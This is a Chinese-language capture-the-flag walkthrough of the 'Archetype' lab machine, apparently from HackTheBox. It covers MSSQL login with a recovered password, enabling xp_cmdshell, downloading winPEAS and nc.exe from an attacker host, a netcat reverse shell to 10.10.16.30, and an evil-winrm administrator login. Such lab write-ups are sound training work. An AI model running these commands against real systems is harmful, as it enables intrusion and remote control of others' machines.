# Archetype

下载

![image-20240727142012201](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240727142012201.png)



![image-20240727142035966](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240727142035966.png)

得到密码：

```
M3g4c0rp123
```

连接mssql

```
impacket-mssqlclient sql_svc:'M3g4c0rp123'@10.129.95.187 -windows-auth
```

![image-20240727141929681](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240727141929681.png)

开启xp_cmdshell

```
 use master
 exec_as_login sa
 EXEC sp_configure 'show advanced options', 1
 RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell';
```

```
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://10.10.16.30:9090/winPEASx64.exe -OutFile C:\Users\Public\Documents\winPEASx64.exe"';
```

![image-20240727145701586](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240727145701586.png)



```
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://10.10.16.30:9090/nc.exe -OutFile C:\Users\Public\Documents\nc.exe"';
```

![image-20240727145335247](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240727145335247.png)

![image-20240727145713344](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240727145713344.png)



反弹一个shell

```
exec xp_cmdshell 'c:\users\public\documents\nc.exe -e cmd.exe 10.10.16.30 4444';
```

![image-20240727150201841](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240727150201841.png)

![image-20240727150237457](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240727150237457.png)



运行winPEASx64.exe



![image-20240727150542496](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240727150542496.png)



查看文件

![image-20240727150655092](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240727150655092.png)



桌面flag

![image-20240727151038760](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240727151038760.png)



使用工具Evil-winrm连接远程主机

```
Evil-winrm 是一款使用ruby 语言开发的开源工具。 该工具具有许多很酷的功能，包括使用纯文本密码远程登录、SSL 加密登录、 NTLM 哈希登录、密钥登录、文件传输、日志存储等功能。该开发工具的作者不断更新工具并长期维护更新。 使用 evil-winrm，我们可以获得远程主机的 PowerShell命令终端会话。
```

```
evil-winrm -u administrator -p 'MEGACORP_4dm1n!!' -i 10.129.95.187
```

![image-20240727152123302](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240727152123302.png)



![image-20240727152236861](C:\Users\andi\AppData\Roaming\Typora\typora-user-images\image-20240727152236861.png)

